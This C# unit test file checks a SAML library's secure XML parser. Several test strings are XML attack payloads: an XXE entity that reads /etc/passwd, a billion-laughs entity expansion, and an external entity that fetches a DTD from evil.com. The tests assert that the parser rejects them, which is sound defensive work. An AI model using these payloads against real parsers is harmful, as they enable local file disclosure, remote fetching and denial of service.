// Copyright (c) Duende Software. All rights reserved.
// See LICENSE in the project root for license information.

using System.Xml;
using Duende.IdentityServer.Internal.Saml.Infrastructure;

namespace UnitTests.Saml;

/// <summary>
/// Security tests for SecureXmlParser to ensure protection against common XML attacks
/// </summary>
public class SecureXmlParserTests
{
    private const string Category = "Secure XML Parser";

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_valid_xml_should_succeed()
    {
        // Arrange
        var validXml = "<root><child>value</child></root>";

        // Act
        var doc = SecureXmlParser.LoadXmlDocument(validXml);

        // Assert
        doc.ShouldNotBeNull();
        doc.DocumentElement.ShouldNotBeNull();
        doc.DocumentElement!.Name.ShouldBe("root");
        doc.SelectSingleNode("//child")!.InnerText.ShouldBe("value");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_x_element_with_valid_xml_should_succeed()
    {
        // Arrange
        var validXml = "<root><child>value</child></root>";

        // Act
        var element = SecureXmlParser.LoadXElement(validXml);

        // Assert
        element.ShouldNotBeNull();
        element.Name.LocalName.ShouldBe("root");
        element.Element("child")!.Value.ShouldBe("value");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_x_document_with_valid_xml_should_succeed()
    {
        // Arrange
        var validXml = "<root><child>value</child></root>";

        // Act
        var doc = SecureXmlParser.LoadXDocument(validXml);

        // Assert
        doc.ShouldNotBeNull();
        doc.Root.ShouldNotBeNull();
        doc.Root!.Name.LocalName.ShouldBe("root");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_null_xml_should_throw_argument_null_exception() =>
        // Act & Assert
        Should.Throw<ArgumentNullException>(() =>
            SecureXmlParser.LoadXmlDocument(null!));

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_empty_xml_should_throw_argument_null_exception() =>
        // Act & Assert
        Should.Throw<ArgumentNullException>(() =>
            SecureXmlParser.LoadXmlDocument(string.Empty));

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_xxe_attack_should_throw_xml_exception()
    {
        // Arrange - XXE attack attempting to read local file
        var xxeAttack = @"<?xml version=""1.0""?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM ""file:///etc/passwd"">
]>
<root>&xxe;</root>";

        // Act & Assert
        var exception = Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(xxeAttack));

        exception.Message.ShouldContain("prohibited constructs");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_dtd_attack_should_throw_xml_exception()
    {
        // Arrange - DTD declaration should be prohibited
        var dtdAttack = @"<?xml version=""1.0""?>
<!DOCTYPE root [
  <!ELEMENT root ANY>
]>
<root>content</root>";

        // Act & Assert
        var exception = Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(dtdAttack));

        exception.Message.ShouldContain("prohibited constructs");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_billion_laughs_attack_should_throw_xml_exception()
    {
        // Arrange - Billion laughs (entity expansion) attack
        var billionLaughsAttack = @"<?xml version=""1.0""?>
<!DOCTYPE lolz [
  <!ENTITY lol ""lol"">
  <!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">
  <!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">
  <!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">
]>
<lolz>&lol4;</lolz>";

        // Act & Assert
        Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(billionLaughsAttack));
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_external_entity_reference_should_throw_xml_exception()
    {
        // Arrange - External entity reference attack
        var externalEntityAttack = @"<?xml version=""1.0""?>
<!DOCTYPE root [
  <!ENTITY external SYSTEM ""http://evil.com/malicious.dtd"">
]>
<root>&external;</root>";

        // Act & Assert
        Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(externalEntityAttack));
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_message_exceeding_max_size_should_throw_xml_exception()
    {
        // Arrange - Create XML larger than 1MB
        var largeContent = new string('X', SecureXmlParser.MaxMessageSize + 1);
        var largeXml = $"<root>{largeContent}</root>";

        // Act & Assert
        var exception = Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(largeXml));

        exception.Message.ShouldContain("exceeds maximum allowed size");
        exception.Message.ShouldContain(SecureXmlParser.MaxMessageSize.ToString());
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_comments_should_ignore_comments()
    {
        // Arrange - XML with comments
        var xmlWithComments = @"<root>
  <!-- This is a comment -->
  <child>value</child>
  <!-- Another comment -->
</root>";

        // Act
        var doc = SecureXmlParser.LoadXmlDocument(xmlWithComments);

        // Assert
        doc.ShouldNotBeNull();
        // Comments should be ignored (not present in the document)
        var comments = doc.SelectNodes("//comment()");
        comments.ShouldNotBeNull();
        comments!.Count.ShouldBe(0);
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_processing_instructions_should_ignore_processing_instructions()
    {
        // Arrange - XML with processing instructions
        var xmlWithPI = @"<?xml version=""1.0""?>
<?xml-stylesheet type=""text/xsl"" href=""style.xsl""?>
<root>
  <child>value</child>
</root>";

        // Act
        var doc = SecureXmlParser.LoadXmlDocument(xmlWithPI);

        // Assert
        doc.ShouldNotBeNull();
        // Processing instructions should be ignored
        var pis = doc.SelectNodes("//processing-instruction()");
        pis.ShouldNotBeNull();
        pis!.Count.ShouldBe(0);
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_malformed_xml_should_throw_xml_exception()
    {
        // Arrange
        var malformedXml = "<root><unclosed>";

        // Act & Assert
        Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXmlDocument(malformedXml));
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_with_saml_response_should_succeed()
    {
        // Arrange - Real SAML Response structure
        var samlResponse = @"<samlp:Response xmlns:samlp=""urn:oasis:names:tc:SAML:2.0:protocol""
                            xmlns:saml=""urn:oasis:names:tc:SAML:2.0:assertion""
                            ID=""_response123""
                            Version=""2.0""
                            IssueInstant=""2024-01-01T00:00:00Z"">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value=""urn:oasis:names:tc:SAML:2.0:status:Success""/>
  </samlp:Status>
  <saml:Assertion ID=""_assertion123"" Version=""2.0"" IssueInstant=""2024-01-01T00:00:00Z"">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>";

        // Act
        var doc = SecureXmlParser.LoadXmlDocument(samlResponse);

        // Assert
        doc.ShouldNotBeNull();
        doc.DocumentElement!.LocalName.ShouldBe("Response");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_xml_document_preserves_whitespace()
    {
        // Arrange - XML with specific whitespace (important for signatures)
        var xmlWithWhitespace = @"<root>
    <child>value</child>
</root>";

        // Act
        var doc = SecureXmlParser.LoadXmlDocument(xmlWithWhitespace);

        // Assert
        doc.ShouldNotBeNull();
        doc.PreserveWhitespace.ShouldBeTrue();
        // Whitespace should be preserved
        doc.InnerXml.ShouldContain("\n");
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_x_element_with_xxe_attack_should_throw_xml_exception()
    {
        // Arrange
        var xxeAttack = @"<?xml version=""1.0""?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM ""file:///etc/passwd"">
]>
<root>&xxe;</root>";

        // Act & Assert
        Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXElement(xxeAttack));
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_x_document_with_billion_laughs_attack_should_throw_xml_exception()
    {
        // Arrange
        var billionLaughsAttack = @"<?xml version=""1.0""?>
<!DOCTYPE lolz [
  <!ENTITY lol ""lol"">
  <!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">
]>
<lolz>&lol2;</lolz>";

        // Act & Assert
        Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXDocument(billionLaughsAttack));
    }

    [Fact]
    [Trait("Category", Category)]
    public void load_x_element_with_message_exceeding_max_size_should_throw_xml_exception()
    {
        // Arrange
        var largeContent = new string('X', SecureXmlParser.MaxMessageSize + 1);
        var largeXml = $"<root>{largeContent}</root>";

        // Act & Assert
        var exception = Should.Throw<XmlException>(() =>
            SecureXmlParser.LoadXElement(largeXml));

        exception.Message.ShouldContain("exceeds maximum allowed size");
    }

    [Fact]
    [Trait("Category", Category)]
    public void max_message_size_should_be_1_mb() =>
        // Assert
        SecureXmlParser.MaxMessageSize.ShouldBe(1048576);
}
